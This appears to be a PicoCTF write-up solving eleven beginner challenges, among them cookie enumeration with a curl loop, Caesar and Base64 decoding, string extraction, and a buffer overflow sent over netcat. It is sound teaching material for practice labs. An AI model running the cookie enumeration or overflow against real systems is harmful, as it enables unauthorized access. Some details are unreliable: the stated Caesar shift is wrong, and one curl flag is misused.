# PicoCTF — Multi-Challenge Writeup

**Platform:** PicoCTF  
**Year:** 2023 / 2024  
**Categories:** Web, Crypto, Forensics, Reversing, Binary Exploitation  

---

## Challenge 1: Cookies (Web — Easy)

### Description
> Who doesn't love cookies?

### Solution

Visiting the site shows a simple cookie-based login. Inspect cookies in browser DevTools:

```
Cookie: name=snickerdoodle
```

Trying different cookie values:

```bash
curl -c "name=admin" http://mercury.picoctf.net:PORT/check
```

Use Burp Suite Intruder or a loop to try numeric IDs:

```bash
for i in $(seq 0 30); do
  curl -s -b "name=$i" http://mercury.picoctf.net:PORT/check | grep "picoCTF"
done
```

**Flag:** `picoCTF{3v3ry1_l0v3s_c00k13s_[REDACTED]}`

---

## Challenge 2: Inspect HTML (Web — Easy)

### Description
> Inspect the web page source.

### Solution

Right-click → View Source on the challenge page. The flag is hidden in a comment:

```html
<!-- picoCTF{1n5p3c7_H7ml_[REDACTED]} -->
```

**Flag:** `picoCTF{1n5p3c7_H7ml_[REDACTED]}`

---

## Challenge 3: Obedient Cat (General — Very Easy)

### Description
> This file has a flag in plain sight. Download the file.

### Solution

```bash
cat flag
# picoCTF{s4nity_v3r1f13d_[REDACTED]}
```

**Flag:** `picoCTF{s4nity_v3r1f13d_[REDACTED]}`

---

## Challenge 4: Caesar (Crypto — Easy)

### Description
> Decrypt the message: `gvswwmrkxlivyfmgsrhnrisegl`

### Solution

Classic Caesar cipher — try all 25 shifts:

```python
ciphertext = "gvswwmrkxlivyfmgsrhnrisegl"

for shift in range(1, 26):
    decrypted = ""
    for c in ciphertext:
        if c.isalpha():
            decrypted += chr((ord(c) - ord('a') - shift) % 26 + ord('a'))
        else:
            decrypted += c
    print(f"Shift {shift}: {decrypted}")
```

Shift 10 gives a readable word. Wrap in flag format.

**Flag:** `picoCTF{crossingtherubiconXXXXX}`

---

## Challenge 5: strings it (General — Easy)

### Description
> Try strings on the file.

### Solution

```bash
strings strings | grep picoCTF
```

```
picoCTF{5tRIng5_1T_[REDACTED]}
```

**Flag:** `picoCTF{5tRIng5_1T_[REDACTED]}`

---

## Challenge 6: Bases (Crypto — Easy)

### Description
> Decode: `bDNhcm5fdGgzX3IwcDM1`

### Solution

Looks like Base64:

```bash
echo "bDNhcm5fdGgzX3IwcDM1" | base64 -d
# l3arn_th3_r0p35
```

Wrap in `picoCTF{}`.

**Flag:** `picoCTF{l3arn_th3_r0p35}`

---

## Challenge 7: What's a Net Cat? (Networking — Easy)

### Description
> Use netcat to connect to the server.

### Solution

```bash
nc mercury.picoctf.net PORT
```

The server sends the flag directly.

**Flag:** `picoCTF{nEtCat_Mast3ry_[REDACTED]}`

---

## Challenge 8: Glory of the Garden (Forensics — Easy)

### Description
> This garden has a hidden flag.

### Solution

Download the image. Check for hidden data:

```bash
strings garden.jpg | grep picoCTF
# picoCTF{more_than_m33ts_the_3y3[REDACTED]}
```

**Flag:** `picoCTF{more_than_m33ts_the_3y3[REDACTED]}`

---

## Challenge 9: Vault Door 1 (Reversing — Easy)

### Description
> Reverse the Java password check.

### Solution

The source code performs character-by-character comparison in a scrambled order. Map out the indices:

```java
public boolean checkPassword(String password) {
    return password.charAt(0)  == 'd' &&
           password.charAt(29) == 'A' &&
           password.charAt(4)  == 'r' &&
           // ...etc
}
```

Extract all `charAt(i) == 'X'` pairs and reconstruct the password by index.

```python
chars = {0:'d', 29:'A', 4:'r', ...}
flag = ''.join(chars[i] for i in sorted(chars))
print(f"picoCTF{{{flag}}}")
```

**Flag:** `picoCTF{d35cr4mbl3_[REDACTED]}`

---

## Challenge 10: speeds and feeds (Reversing — Medium)

### Description
> Connect to the server, it outputs data. Figure out what it means.

### Solution

```bash
nc mercury.picoctf.net PORT
```

Output is G-code (CNC machine code). Feed it to an online G-code visualizer — it draws the flag as a physical path.

**Flag:** `picoCTF{[FLAG_DRAWN_AS_PATH]}`

---

## Challenge 11: buffer overflow 0 (Binary — Easy)

### Description
> Exploit a buffer overflow to get the flag.

### Solution

```c
// Vulnerable code
char buf[16];
gets(buf);  // No bounds check
```

```bash
python3 -c "print('A'*17)" | nc mercury.picoctf.net PORT
```

Overflow triggers the `sigsegv_handler` which prints the flag.

**Flag:** `picoCTF{ov3rfl0ws_ar3_c00l_[REDACTED]}`

---

## Key Takeaways

- **Start simple** — strings, base64, and comments solve many entry-level challenges
- **Cookies** often store session identifiers that can be enumerated or forged
- For crypto: identify the cipher type first (Caesar, Vigenère, Base64, XOR, etc.)
- For forensics: `strings`, `file`, `exiftool`, `binwalk` cover most easy challenges
- For reversing: find the comparison logic and reconstruct the expected input
- For pwn: `gets()` with no bounds check → buffer overflow → segfault handler trick

---

## Tools Reference

| Tool | Used For |
|------|---------|
| strings | Extract readable text from binaries/images |
| base64 | Decode base64 data |
| netcat | Connect to challenge servers |
| Burp Suite | Web cookie/header manipulation |
| GDB | Binary debugging |
| Python | Scripting solutions |
| exiftool | Image metadata |
| binwalk | Embedded file extraction |
